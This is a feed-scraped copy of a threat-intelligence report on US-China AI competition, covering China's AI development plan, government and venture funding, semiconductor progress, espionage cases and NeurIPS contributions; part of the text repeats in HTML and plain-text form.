2030.</p>\n        <p>China’s government has sought to accelerate the development of a world-leading, globally influential AI industry since 2017, when authorities adopted a dedicated plan for achieving this goal. DeepSeek’s unveiling of R1 in January 2025 was a key milestone in this endeavor. R1’s capabilities reflect — and support continuing — noteworthy advances and lines of effort within China’s AI ecosystem. China’s AI research community is very likely benefiting from the government’s supportive policy environment, government-led investment initiatives, access to an increasingly high-quality talent pool, and increasing links between academia and industry. Chinese AI companies like DeepSeek have realized performance gains by innovating and embracing open source. These companies have also become proficient at adopting techniques implemented by US peers and domestic rivals and prioritizing cost efficiency to remain competitive in domestic markets. Chinese open-source models are being adopted domestically and abroad, while inventors and organizations in China are filing more patents for generative AI applications in many key industries such as software, finance, and energy.</p>\n        <p>Despite this progress, China’s AI industry faces important challenges. Total private sector investment in AI lags far behind the US, and central government funding likely trails US federal investment by a small margin. China’s access to domestic AI-relevant talent is improving and the attractiveness of its domestic industry is increasing, but it is still insufficient, and the US likely retains its historical advantages. China’s regulations, although pioneering, likely create a drag on innovation for teams with any interest in making their products public. Moreover, China’s semiconductor industry — while achieving notable advances in spite of international export controls on specialized technology — is still unlikely to meet the rapidly growing demand for AI accelerator chips.</p>\n        <p>Maintaining leadership in the race to artificial general intelligence (AGI) is almost certainly perceived in China and the US as critical to their national security. To this end, China is almost certain to continue applying its kit of licit and illicit tools for advancing national development, to include economic espionage and foreign talent recruitment. The US and allied governments should closely monitor major developments by Chinese generative AI companies and public and private investment in research and development (R&amp;D), in addition to monitoring indicators of AI diffusion, such as applications and patents. Western AI companies should consider proactively protecting themselves from model distillation and intellectual property (IP) theft.

Like missile production, the AGI race is not measured solely by <a href=\"https://www.tandfonline.com/doi/abs/10.1080/08956308.2024.2324407\">innovation capacity</a> (launching Sputnik) but also <a href=\"https://www.fpri.org/article/2024/09/explaining-chinas-diffusion-deficit/\">diffusion capacity</a>, or the ability of national ecosystems to align capital, talent, and policies to rapidly convert innovations to economically productive processes (winning the Cold War). The missile gap analogy is also accurate insofar as US leaders <a href=\"https://www.armscontrol.org/act/2011-05/missile-gap-myth-and-its-progeny\">long possessed</a> inaccurate data on Soviet missile capabilities; it was only by 1961 that innovations in satellite imagery <a href=\"https://www.thespacereview.com/article/523/1\">allowed</a> decision-makers to obtain reliable data on this so-called \"missile gap.\" Following the launch of the CORONA satellite project to monitor Soviet ICBM capabilities and Chinese nuclear testing, US President Lyndon Johnson <a href=\"https://web.archive.org/web/20220505011605/https://www.nytimes.com/1995/09/12/science/spy-satellites-early-role-as-floodlight-coming-clear.html\">admitted</a> in 1967: \"We've spent $35 billion or $40 billion on the space program. [...] We were doing things we didn't need to do. We were building things we didn't need to build. We were harboring fears we didn't need to harbor.\" Similarly, advances (whether real or speculative) in Chinese AI development are very likely fueling funding for AI research in the US, where AI capital expenditure is <a href=\"https://www.businessinsider.com/big-tech-ai-capex-spend-meta-google-amazon-microsoft-earnings-2025-2\">projected to reach over $320 billion</a> in 2025, and influencing <a href=\"https://cdn.openai.com/global-affairs/ostp-rfi/ec680b75-d539-4653-b297-8bcf6e5f7686/openai-response-ostp-nsf-rfi-notice-request-for-information-on-the-development-of-an-artificial-intelligence-ai-action-plan.pdf\">opinions</a> on issues like AI regulation.</p>\n        <p>Maintaining an accurate threat perception of Chinese AI will almost certainly be key for major business and national security decision-makers in the US and its partners in the coming years. Despite the public perception of sudden and opaque progress via the lens of a \"Sputnik moment,\" the development of China’s AI ecosystem almost certainly bears the fruit of long-term investments, iterative innovation, and the necessity for efficiency gains in the face of hardened chip export controls.</p>\n        <h2>China’s AI Industry and Landscape</h2>\n        <p>In July 2017, China’s State Council <a href=\"https://web.archive.org/web/20250303185319/http://www.gov.cn/zhengce/content/2017-07/20/content_5211996.htm\">issued</a> the \"New Generation Artificial Intelligence Development Plan\" (AIDP; 新一代人工智能发展规划), which outlined an ambitious path to <a href=\"https://digichina.stanford.edu/work/full-translation-chinas-new-generation-artificial-intelligence-development-plan-2017/\">achieving</a> \"world-leading\" AI theories, technologies, and applications and becoming the \"world’s primary AI innovation center\" by 2030. To achieve these goals, the AIDP calls (in part) for the activities listed below. The AIDP also outlined key challenges China faced at the time — and to some extent continues to face — including a lack of breakthroughs in basic AI theory, algorithms, high-end chips, and other resources and outputs. Since that time, Chinese universities and businesses have become increasingly involved in AI conferences at the frontiers of AI research and have released hundreds of generative AI models. At the same time, China’s semiconductor industry is steadily advancing its capabilities in spite of international restrictions.</p>\n        <p>According to the AIDP, China would seek — and in many ways has begun, as documented in this report — to:</p>\n        <ul>\n          <li>Support a development framework that enables industry, academia, and other sectors to pursue joint and cross-disciplinary innovation</li>\n          <li>Seek breakthroughs in R&amp;D, applications, and overall industry, including along the AI-relevant industrial chain</li>\n          <li>Improve training and recruitment of talent, focusing on AI specifically as well as AI’s application in other fields</li>\n          <li>Promote AI applications and AI-related innovations across industries, enterprises, and services</li>\n          <li>Coordinate support for AI across China’s main science and technology (S&amp;T) pillars, including key programs, megaprojects, bases, and talent plans</li>\n          <li>Adopt a system of laws, regulations, and norms to aid the development of AI</li>\n          <li>Disseminate news of China’s AI progress to foster a society enthusiastic about, and supportive of, AI development</li>\n        </ul>\n        <p>China’s S&amp;T innovation <a href=\"https://scsp222.substack.com/p/the-missing-piece-in-chinas-innovation\">apparatus</a> very likely <a href=\"https://web.archive.org/web/20240618141413/https://mp.weixin.qq.com/s/NZxXb-LTiM3-PY4M36_VSA\">emphasizes</a> (though it is perceived to be deficient in) collaboration among government — including laboratories and state-owned enterprises [SOE]) — industry, and academia. Accordingly, entities from each of these sectors contribute to China’s AI development enterprise. Entities from all three sectors are increasingly producing noted contributions to AI R&amp;D and applications. Contributions to theoretical research can be observed in scholarly papers accepted to the prestigious AI-focused Conference on Neural Information Processing Systems (NeurIPS) since 2021. <strong>Table 1</strong> lists examples of government, industry, and academic entities from among the top fifteen institutions named as the affiliation of one or more co-authors on papers accepted by the conference (2021–2024).

SHLAB’s website further <a href=\"https://web.archive.org/web/20240908135712/https://www.shlab.org.cn/aboutus\">asserts</a> strategic partnerships with at least thirteen universities across China.

Noteworthy frontier model companies contributing to China’s LLM capabilities — most often from the private sector, with some seen in the NeurIPS data — include DeepSeek, Alibaba, Baidu, 01.AI, Tencent, Stepfun, ByteDance, Infinigence AI, and ModelBest. Signifying the important role of academia-industry linkages, China’s \"new AI tigers\" — Baichuan AI, MiniMax, Moonshot AI, and Zhipu AI — were <a href=\"https://itif.org/publications/2024/08/26/how-innovative-is-china-in-ai/\">founded</a> by Tsinghua University faculty and graduates.</p>\n        <p>China’s semiconductor industry plays a key role in supporting the country’s ecosystem for AI development, which is almost certainly critical to achieving the AIDP’s goals. Faced with explicit efforts by the US to curtail China’s advances in both AI and semiconductors, China’s support — including financial support — for the domestic semiconductor industry has almost certainly accelerated. One vehicle of state-led investment, the <a href=\"https://www.reuters.com/technology/china-sets-up-475-bln-state-fund-boost-semiconductor-industry-2024-05-27/\">multi-phase</a> China Integrated Circuit Industry Investment Fund (\"Big Fund\"; 国家集成电路产业投资基金) had minority <a href=\"https://thechinaproject.com/2023/02/03/chinas-top-10-semiconductor-firms/\">ownership</a> in at least 74 domestic semiconductor companies as of February 2023. Huawei is a particularly important and rising <a href=\"https://merics.org/en/report/huawei-quietly-dominating-chinas-semiconductor-supply-chain\">contributor</a> to China’s semiconductor industry, but multiple Chinese companies are making progress or experimenting with methods (<strong>Table 2</strong>) that — while far from cutting-edge capabilities and likely currently insufficient for domestic demand — likely have the potential to alleviate China’s dependence on the US and others in the long term. In March 2025, Bloomberg reported (citing unnamed sources) that China’s Ant Group had <a href=\"https://www.bloomberg.com/news/articles/2025-03-24/jack-ma-backed-ant-touts-ai-breakthrough-built-on-chinese-chips\">found</a> a way to train AI models using domestically produced chips at a cheaper cost but with similar results compared to those obtained by using US chips.</p>\n        <div>\n          <div>\n            <div><strong>China’s Semiconductor Development</strong></div>\n          </div>\n          <div>\n            <div><strong>Huawei is now mass-producing 7-nanometer (nm) Ascend 910B and 910C AI chips</strong>, marking significant progress despite yield rates reportedly at only 40% — though Huawei’s yield was reportedly at 20% only a year before.</div>\n          </div>\n          <div>\n            <div><strong>China is now forecasted to become the world’s single largest source of IC wafer manufacturing by 2026</strong>, likely led by growth in 12-inch wafer fabs by Big Fund investees like Semiconductor Manufacturing International Corporation (SMIC), Hua Hong Semiconductor, Runpeng Semiconductor (润鹏半导体, a subsidiary of China Resources Microelectronics), Tiancheng Advanced (天成先进), Yandong Microelectronics (燕东微), and Zensemi (广州增芯).</div>\n          </div>\n          <div>\n            <div><strong>Chinese companies are currently exploring alternative techniques to manufacture extreme ultraviolet (EUV) lithography equipment,</strong> with patents by the Harbin Institute of Technology (哈尔滨工业大学) and Shanghai Micro Electronics Equipment (SMEE, \"上海微电子\") exploring laser-induced discharge plasma (LDP, \"激光诱导放电等离子体\") and laser-produced plasma (LPP, \"激光产生的等离子体\") EUV sources, respectively.</div>\n          </div>\n          <div>\n            <div><strong>China is progressing on domestic production of deep ultraviolet (DUV) lithography equipment,</strong> including recent breakthroughs in domestic manufacturing of DUV photoresists by Hubei Dinglong (鼎龙) and Shenzhen Rongda (容大感光).</div>\n          </div>\n        </div>\n        <p><strong><em>Table 2:</em></strong> <em>Evidence of development and milestones in China’s domestic semiconductor industry (Source: Insikt Group)</em><br /><br />Economic espionage, whether state-led or otherwise, also very likely supports China’s progress in advancing its AI and semiconductor industries. It would be inaccurate to attribute all progress to this activity, but government-directed and tacitly allowed espionage almost certainly remains an important instrument in China’s <a href=\"https://www.uscc.gov/sites/default/files/2025-02/Kyle_Chan_Testimony.pdf\">toolkit</a> for achieving modernization. In October 2023, intelligence leaders of the Five Eyes alliance <a href=\"https://www.reuters.com/world/five-eyes-intelligence-chiefs-warn-chinas-theft-intellectual-property-2023-10-18/\">noted</a> AI as one sector targeted by China’s illicit actions. In February 2025, the US Department of Justice <a href=\"https://www.justice.gov/opa/pr/superseding-indictment-charges-chinese-national-relation-alleged-plan-steal-proprietary-ai\">indicted</a> a former software engineer at Google over alleged attempts between mid-2022 and mid-2023 to steal proprietary information on hardware and software enabling supercomputing in support of large AI models. The engineer allegedly intended to use the information to support his own and another early-stage AI-related company. In November 2024, a former employee of South Korea’s SK Hynix Inc. was <a href=\"https://www.asiafinancial.com/sk-hynix-worker-jailed-for-stealing-chip-tech-korea-bizwire\">convicted</a> of printing and seeking to retain proprietary documents on semiconductor manufacturing solutions in mid-2022, likely to <a href=\"https://web.archive.org/web/20240528140713/https://m.koreatimes.co.kr/pages/article.amp.asp?newsIdx=375511\">facilitate</a> her role in a new position at Huawei. Although not always a form of espionage, China’s AI sector very likely further benefits from concerted efforts to <a href=\"https://www.trendforce.com/news/2025/02/21/new-ai-talent-race-heats-up-in-china-as-xiaomi-bytedance-and-alibaba-compete-for-experts/\">attract</a> and <a href=\"https://chinatalenttracker.cset.tech/\">recruit</a> <a href=\"https://www.reuters.com/technology/china-quietly-recruits-overseas-chip-talent-us-tightens-curbs-2023-08-24/\">foreign</a> <a href=\"https://cset.georgetown.edu/publication/gao-huajian-and-the-china-talent-returnee-question/\">talent</a>. Additionally, there is <a href=\"https://www.theverge.com/news/601195/openai-evidence-deepseek-distillation-ai-data\">evidence</a> that Chinese companies have circumvented foreign platforms’ terms of service to enhance their own models through model distillation techniques.</p>\n        <h3>Government and Venture Capital (VC) Funding</h3>\n        <p>Funding for AI-related technologies is likely on an upward <a href=\"https://web.archive.org/web/20250317132408/http://www.xinhuanet.com/fortune/20250313/a7cb29ba2b3a49f4a9ac9a7c57dac9eb/c.html\">trajectory</a> in both the US and China as of early 2025. Direct comparisons are difficult due to definitional issues and — especially with regard to China — data intransparency, but US federal government funding for civilian (non-military) AI likely exceeds the Chinese central government’s funding by up to several billion USD per year, especially in light of evidence of declining expenditure by Beijing until approximately 2023 (likely in part due to COVID-19). The balance of government-led investment when including activity at the state and provincial levels likely leans in China’s favor, where guidance funds combine public and private capital to invest approximately $16 billion annually in likely AI-related companies (broadly defined). Total private-sector investment in AI companies in the US far outstrips private-sector investment in China.</p>\n        <p>According to Federal Budget IQ, the US federal government has <a href=\"https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/\">increased</a> its AI and IT R&amp;D spending from $8.2 billion in 2021 to $10.4 billion in 2024, a nearly 27% increase. The 2025 fiscal year budget earmarked $11.2 billion for AI and IT R&amp;D spending. Removing spending by the US Department of Defense (DoD; $2.035 billion) and the Defense Advanced Research Projects Agency (DARPA; $1.41 billion), US federal spending on AI and IT R&amp;D for civilian applications represents approximately $7.33 billion. Within this, the budget for \"core\" AI ($1.955 billion) is the largest component, though funding for the likely AI-relevant area of high-capacity computing is also rising quickly. The US federal budget for \"core\" and \"cross-cut\" AI in fiscal year 2025 combined is $2.8 billion (excluding US DoD and DARPA).</p>\n        <p>In China, total central government funding for AI is much more opaque. <strong>Figure 2</strong> and <strong>Figure 3</strong> show likely AI-related investment in basic, applied, and experimental R&amp;D over recent years for two of China’s <a href=\"https://www.uscc.gov/sites/default/files/2024-02/Ngor_Luong_Testimony.pdf\">largest</a> government-run institutions: the National Natural Science Foundation of China (NSFC) and the Chinese Academy of Sciences (CAS). Specifically, <strong>Figure 3</strong> presents data from the budgets of three CAS institutes particularly <a href=\"https://cset.georgetown.edu/publication/fueling-chinas-innovation-the-chinese-academy-of-sciences-and-its-role-in-the-prcs-st-ecosystem/\">focused</a> on AI. <strong>Figure 4</strong> shows notionally earmarked funds for research to be conducted under China’s \"New Generation Artificial Intelligence\" Megaproject (科技创新 2030—\"新一代人工智能\"重大项目). In addition to these data points and trends, the two organizations <a href=\"https://cset.georgetown.edu/publication/chinas-state-key-laboratory-system/\">supervising</a> nearly half of China’s state key labs (SKLs) — the Ministry of Education and CAS — cumulatively budgeted 2.4 billion RMB ($327 million) under associated R&amp;D line items. Of this, approximately 29% would go to SKLs in the information and communications technology field, assuming funds were distributed equally among all SKLs supervised by these organizations and not accounting for other known unknowns.</p>\n        <p>Insikt Group’s review of the data summarized above and evidence from other central government funding channels leads us to a low-confidence estimate that China’s central government spends on the order of several billion USD annually on likely AI-related R&amp;D, roughly similar to the US government’s <a href=\"https://federalbudgetiq.com/insights/federal-ai-and-it-research-and-development-spending-analysis/#:~:text=For%20core%20AI%20funding%2C%20the,and%20Agriculture%20(%24104%20million).\">spending</a> on \"core\" and \"cross-cut\" AI (excluding US DoD and DARPA). Because \"core\" and \"cross-cut\" AI have a clear definition and estimating China’s funding relies on imperfect visibility into the research program it targets, it is likely that US federal government funding for AI is higher than that of China’s central government. Total Chinese government-led investment in AI — via guidance funds — likely exceeds US cumulative federal and state investment, however (discussed further below).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"us-china-ai-002.png\" src=\"https://www.recordedfuture.com/media_109098e94d8f6b4a30c4a71c711bbcdeda487a9a1.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1200\" height=\"742\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 2:</em></strong> <em>NSFC National Natural Sciences Fund Information Science Department (ISD) R&amp;D expenditures (actual) for AI and automation, 2018–2024 (RMB all years converted to 2025 dollars) (Source: Insikt Group)</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"us-china-ai-003.png\" src=\"https://www.recordedfuture.com/media_1720df919237426a4aab50b33750ec3ab51d471a5.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1200\" height=\"742\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 3:</em></strong> <em>R&amp;D expenditures (2018–2023 actual; 2024 budgeted) for AI-focused CAS research institutes, 2018–2024 (RMB all years converted to 2025 dollars) (Source: Insikt Group)</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"us-china-ai-004.png\" src=\"https://www.recordedfuture.com/media_16f7dadc5972786d4227082d2598f070667978858.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1200\" height=\"742\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4:</em></strong> <em>Annual proposed funding for projects announced under the \"New Generation Artificial Intelligence\" Megaproject, 2018 and 2020–2022 (data not available for 2019; RMB all years converted to 2025 dollars) (Source: Insikt Group)</em></div>\n          </div>\n        </div>\n        <p>The declining trend through the early 2020s is likely related to the impact of COVID-19 on China’s economy, but should also be viewed cautiously given missing data from other central government funding channels. As of early 2025, central government actors have signaled increasing interest in AI. In January 2025, Bank of China <a href=\"https://web.archive.org/web/20250127130750/https://www.bankofchina.com/aboutboc/bi1/202501/t20250123_25254674.html\">announced</a> a five-year plan for financially supporting the AI industry value chain with a minimum of one trillion RMB ($138 billion). In March 2025, China’s National Development and Reform Commission <a href=\"https://archive.ph/7rzg6\">announced</a> the establishment of a National Innovation Investment Guidance Fund (国家创业投资引导基金). The new fund is being dubbed an \"aircraft carrier-level\" (航母级) fund and will seek to raise one trillion RMB ($138.2 billion) while focusing investment on start-up, early-stage, small-, and medium-sized enterprises in \"frontier domains\" like AI, quantum science, and future energy. Indicating its focus on the concept of \"patient capital,\" the fund’s duration is being set at twenty years — reportedly about five years longer than most other guidance funds.</p>\n        <p>Government guidance funds, such as the one announced in March 2025, have been established at multiple levels of government in China and <a href=\"https://cset.georgetown.edu/publication/understanding-chinese-government-guidance-funds/\">mix</a> funds from governmental and non-governmental sources (including corporate sources). This creates a challenge when attempting to isolate just central government funding. However, research published by the National Bureau of Economic Research (NBER) has <a href=\"https://www.nber.org/system/files/working_papers/w32701/w32701.pdf\">found</a> that more broadly across central, provincial, and local governments, these guidance funds have \"invested in 9,623 unique AI firms through more than 20,000 transactions, in total 184 billion USD\" between 2000 and 2023, with the majority of transactions occurring since 2013. Annualizing this estimate over the 2013–2023 period points to an average spend of $16.7 billion per year, though the NBER study’s method of identifying AI companies was very broad and potentially leads to an overestimate. There are state-level initiatives in the US, such as New York’s Empire AI consortium that has received $565 million in <a href=\"https://www.governor.ny.gov/news/governor-hochul-unveils-fifth-proposal-2024-state-state-empire-ai-consortium-make-new-york\">funding</a> from public and private <a href=\"https://govmarketnews.com/new-york-boosts-ai-research-with-165m-funding-package/\">sources</a>, but they likely do not match sub-national funding in China, which is steadily increasing. In January 2025, two state-backed Chinese investment <a href=\"https://archive.ph/cjS4z\">companies</a> <a href=\"https://archive.ph/RZBdk\">announced</a> the creation of a National Artificial Intelligence Industry Investment Fund (国家人工智能产业投资基金) with an initial registered capital of 60 billion RMB ($8.2 billion).</p>\n        <p>Although China’s government may be ahead in terms of total AI investment — when the likely small lag in central government spending is compared to the likely larger lead in sub-national investment through guidance funds — total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China. This is seen in data (<strong>Figure 5</strong>) collected by both Stanford University’s Center for Human-Centered Artificial Intelligence (Stanford HAI) and the Emerging Technology Observatory (ETO), a project under Georgetown University’s Center for Security and Emerging Technology (CSET). Note that there is likely overlap between the aforementioned investments of China’s guidance funds and the private-sector investment data; that is, this data likely does not exclude investments in AI companies that come from government sources. This private-sector investment data is narrower, however; ETO’s data only reflects investments into 2,100 Chinese AI companies compared to the NBER study’s over 9,000 companies.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"us-china-ai-005.png\" src=\"https://www.recordedfuture.com/media_171a31ad8e38daa610e8912758281e2bdc0df8da9.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1200\" height=\"742\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 5:</em></strong> <em>Disclosed private-sector investment in China and the US, 2013–2023 (Sources:</em> <em><a href=\"https://hai.stanford.edu/ai-index/2024-ai-index-report\">Stanford HAI</a>;</em> <em><a href=\"https://cat.eto.tech/?countries=China+%28mainland%29%2CUnited+States&amp;countryGroups=&amp;dataset=Investment&amp;expanded=Summary-metrics%2CChanges-over-time\">ETO</a>)</em></div>\n          </div>\n        </div>\n        <p>To read the entire analysis, <a href=\"https://assets.recordedfuture.com/insikt-report-pdfs/2025/ta-2025-0508.pdf\">click here</a> to download the report as a PDF.</p>\n      ","content:encodedSnippet":"Executive Summary\nChina has stated its ambition to become the world leader in artificial intelligence (AI) by 2030, a goal that encompasses not only the performance of individual AI models that often attract significant media attention but also AI innovation broadly and widespread adoption of AI for economic and geopolitical benefit. Based on an analysis of key industry pillars informing the US-China competition for AI supremacy — including government and venture capital (VC) funding, industry regulation, talent, technology diffusion, model performance, and compute capacity — Insikt Group assesses that China is unlikely to sustainably surpass the United States (US) on its desired timeline. Currently, China either trails behind or does not clearly lead the US in any of these pillars. The US-China AI competition is likely to become tighter, with China's AI industry likely being a close second to the US globally and its AI models possibly outperforming the US at times or in some sectors. Chinese generative AI models likely lag behind US competitors by approximately three to six months as of this writing, based on Insikt Group analysis of publicly available Elo benchmarks, but potential new algorithmic breakthroughs along with agentic and collaborative AI systems could significantly sway the competitiveness of US or Chinese models before 2030.\nChina’s government has sought to accelerate the development of a world-leading, globally influential AI industry since 2017, when authorities adopted a dedicated plan for achieving this goal. DeepSeek’s unveiling of R1 in January 2025 was a key milestone in this endeavor. R1’s capabilities reflect — and support continuing — noteworthy advances and lines of effort within China’s AI ecosystem. China’s AI research community is very likely benefiting from the government’s supportive policy environment, government-led investment initiatives, access to an increasingly high-quality talent pool, and increasing links between academia and industry. Chinese AI companies like DeepSeek have realized performance gains by innovating and embracing open source. These companies have also become proficient at adopting techniques implemented by US peers and domestic rivals and prioritizing cost efficiency to remain competitive in domestic markets. Chinese open-source models are being adopted domestically and abroad, while inventors and organizations in China are filing more patents for generative AI applications in many key industries such as software, finance, and energy.\nDespite this progress, China’s AI industry faces important challenges. Total private sector investment in AI lags far behind the US, and central government funding likely trails US federal investment by a small margin. China’s access to domestic AI-relevant talent is improving and the attractiveness of its domestic industry is increasing, but it is still insufficient, and the US likely retains its historical advantages. China’s regulations, although pioneering, likely create a drag on innovation for teams with any interest in making their products public. Moreover, China’s semiconductor industry — while achieving notable advances in spite of international export controls on specialized technology — is still unlikely to meet the rapidly growing demand for AI accelerator chips.\nMaintaining leadership in the race to artificial general intelligence (AGI) is almost certainly perceived in China and the US as critical to their national security. To this end, China is almost certain to continue applying its kit of licit and illicit tools for advancing national development, to include economic espionage and foreign talent recruitment. The US and allied governments should closely monitor major developments by Chinese generative AI companies and public and private investment in research and development (R&D), in addition to monitoring indicators of AI diffusion, such as applications and patents. Western AI companies should consider proactively protecting themselves from model distillation and intellectual property (IP) theft. Western hardware manufacturers subject to export controls should continue improving end-customer due diligence processes to remain compliant and avoid selling to proxies of entities sanctioned by the US. Western government, academic, and corporate entities should adopt policies that facilitate the recruitment and retention of global AI talent.\nKey Findings\nChina’s rapidly maturing AI ecosystem is very likely increasingly fostering collaboration between government, industry, and academia, and is supported by steady advances in semiconductor manufacturing.\nGovernment funding for AI-related technologies is likely on an upward trajectory in both the US and China as of early 2025, and China’s overall government-led funding likely exceeds investment by US federal and state governments; however, total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China.\nChina’s regulatory scheme likely hampers Chinese AI capabilities and extends development and deployment timelines — but only among developers aiming for public-facing products, meaning frontier advancements are unlikely to be impeded.\nThe international AI talent pool likely continues to favor the US due to a continuing — though declining — immigration advantage and the quality of elite educational institutions, but the practical implications of this lead for AI competition are likely eroding.\nAI diffusion rather than innovation will very likely determine the \"winner\" in the competition to economically and geopolitically benefit from the technology, but whether the US or China has greater levels of diffusion is unclear, with one metric (patents) nevertheless showing China has a lead in many industries.\nAccording to Insikt Group's analysis of model benchmarks, Elo scores, and industry expert assessments, Chinese generative AI models likely now have a three to six-month performance gap behind US rivals, though this time lag is shortening.\nClosing the performance gap while being cost-competitive is very likely to pay off for China by driving the adoption of Chinese generative AI models domestically and abroad.\nAccess to high-quality training data and IP is an increasingly contested domain where the US likely retains a competitive advantage; companies in both countries are likely leveraging user-generated content (UGC) to train generative AI models.\nAdopting open source is more prevalent among Chinese AI companies and likely enables China to diffuse its models more broadly than US proprietary models.\nUS export controls have also almost certainly prompted the Chinese government to accelerate funding for its AI hardware and semiconductor industries and high-performance computing infrastructure for training and hosting AI models.\nChina’s semiconductor industry likely still faces a bottleneck in producing sub-7 nanometer (nm) chips, and it is almost certainly attempting to develop its own extreme ultraviolet (EUV) lithography tools using alternative techniques to advance domestic AI accelerator production.\nAlthough the current US presidential administration has signalled that maintaining the US’s leading position in AI development is a priority, early actions to decrease public funding for science and target international students over alleged visa infractions likely risk undermining this goal.\nBackground\nThe race to AGI, which is estimated by AI experts and industry leaders to be concluded within the next five to ten years, holds considerable stakes for national security and economic growth. A declining cost and general availability of human-level AI models — meaning that AI can perform most tasks previously done by humans, better than humans — will very likely disrupt the future of work while simultaneously leading to explosive economic growth, with AI estimated to contribute $15.7 trillion to the global economy by 2030. Researchers continue debating the existential risks and adversarial use of AI, ranging from facilitating chemical, biological, radiological, and nuclear (CBRN) threats to targeting democratic processes and supporting offensive cyber operations. The notion of \"AI supremacy\" captures the geopolitical stakes of the AGI race, with the US and China considered by many to be forerunners.\nOn January 20, 2025, Chinese AI research company DeepSeek released R1, an open-source reasoning large language model (LLM) competing with OpenAI’s then state-of-the-art o1 model. The following week, US AI hardware company Nvidia subsequently lost $593 billion in market value, marking the single largest market capitalization loss in US history. Media headlines compared DeepSeek’s release of R1 to the Space Race’s \"Sputnik moment,\" referring to a rapid and unexpected shift in perceived adversary capabilities following the Soviet Union’s surprise launch of the Sputnik satellite into orbit on October 4, 1957.\nThe US-Soviet \"missile gap\" theory is a likely more accurate Cold War analogy of current threat perceptions. Like missile production, the AGI race is not measured solely by innovation capacity (launching Sputnik) but also diffusion capacity, or the ability of national ecosystems to align capital, talent, and policies to rapidly convert innovations to economically productive processes (winning the Cold War). The missile gap analogy is also accurate insofar as US leaders long possessed inaccurate data on Soviet missile capabilities; it was only by 1961 that innovations in satellite imagery allowed decision-makers to obtain reliable data on this so-called \"missile gap.\" Following the launch of the CORONA satellite project to monitor Soviet ICBM capabilities and Chinese nuclear testing, US President Lyndon Johnson admitted in 1967: \"We've spent $35 billion or $40 billion on the space program. [...] We were doing things we didn't need to do. We were building things we didn't need to build. We were harboring fears we didn't need to harbor.\" Similarly, advances (whether real or speculative) in Chinese AI development are very likely fueling funding for AI research in the US, where AI capital expenditure is projected to reach over $320 billion in 2025, and influencing opinions on issues like AI regulation.\nMaintaining an accurate threat perception of Chinese AI will almost certainly be key for major business and national security decision-makers in the US and its partners in the coming years. Despite the public perception of sudden and opaque progress via the lens of a \"Sputnik moment,\" the development of China’s AI ecosystem almost certainly bears the fruit of long-term investments, iterative innovation, and the necessity for efficiency gains in the face of hardened chip export controls.\nChina’s AI Industry and Landscape\nIn July 2017, China’s State Council issued the \"New Generation Artificial Intelligence Development Plan\" (AIDP; 新一代人工智能发展规划), which outlined an ambitious path to achieving \"world-leading\" AI theories, technologies, and applications and becoming the \"world’s primary AI innovation center\" by 2030. To achieve these goals, the AIDP calls (in part) for the activities listed below. The AIDP also outlined key challenges China faced at the time — and to some extent continues to face — including a lack of breakthroughs in basic AI theory, algorithms, high-end chips, and other resources and outputs. Since that time, Chinese universities and businesses have become increasingly involved in AI conferences at the frontiers of AI research and have released hundreds of generative AI models. At the same time, China’s semiconductor industry is steadily advancing its capabilities in spite of international restrictions.\nAccording to the AIDP, China would seek — and in many ways has begun, as documented in this report — to:\nSupport a development framework that enables industry, academia, and other sectors to pursue joint and cross-disciplinary innovation\nSeek breakthroughs in R&D, applications, and overall industry, including along the AI-relevant industrial chain\nImprove training and recruitment of talent, focusing on AI specifically as well as AI’s application in other fields\nPromote AI applications and AI-related innovations across industries, enterprises, and services\nCoordinate support for AI across China’s main science and technology (S&T) pillars, including key programs, megaprojects, bases, and talent plans\nAdopt a system of laws, regulations, and norms to aid the development of AI\nDisseminate news of China’s AI progress to foster a society enthusiastic about, and supportive of, AI development\nChina’s S&T innovation apparatus very likely emphasizes (though it is perceived to be deficient in) collaboration among government — including laboratories and state-owned enterprises [SOE]) — industry, and academia. Accordingly, entities from each of these sectors contribute to China’s AI development enterprise. Entities from all three sectors are increasingly producing noted contributions to AI R&D and applications. Contributions to theoretical research can be observed in scholarly papers accepted to the prestigious AI-focused Conference on Neural Information Processing Systems (NeurIPS) since 2021. Table 1 lists examples of government, industry, and academic entities from among the top fifteen institutions named as the affiliation of one or more co-authors on papers accepted by the conference (2021–2024). Note that there are no top-fifteen NeurIPS contributors from China that are SOEs; two are included in Table 1 to indicate that some SOEs are nevertheless attempting and occasionally succeeding to contribute to frontier AI advancement.\nSector\nEntity\nNo. of Papers (Rank)\nAcademia\nTsinghua University\n643 (1st)\nAcademia\nPeking University\n458 (2nd)\nIndustry\nHuawei Technologies\n228 (6th)\nIndustry\nTencent AI Lab\n197 (7th)\nGovernment (Research Institute)\nShanghai AI Laboratory\n141 (11th)\nGovernment (Research Institute)\nInstitute of Automation of the Chinese Academy of Sciences\n118 (12th)\nGovernment (SOE)\nIntelligent Science and Technology Academy of China Aerospace Science and Industry Corporation\n9 (N/A)\nGovernment (SOE)\nChina Telecommunications Corporation\n2 (N/A)\nTable 1: Chinese government, industry, and academic entities with the most accepted number of NeurIPS submissions (2021–2024) (Source: PaperCopilot)\nShanghai AI Laboratory (SHLAB; 上海人工智能实验室) exemplifies how China’s S&T system supports inter- and intra-sector collaboration. SHLAB was created in 2020 as an almost certainly state-affiliated \"new-type scientific research institution\" (新型科研机构). Described as a \"large-scale comprehensive research base\" (大型综合性研究基地), SHLAB offers open-source information repositories and platforms that facilitate AI development in specific areas. For example, its OpenMMLab is an \"open-source computer vision algorithm system\" that seeks to facilitate academic and industry applications; it claims to have users from more than 100 countries and territories (Figure 1 shows reported user affiliations). SHLAB’s website further asserts strategic partnerships with at least thirteen universities across China. 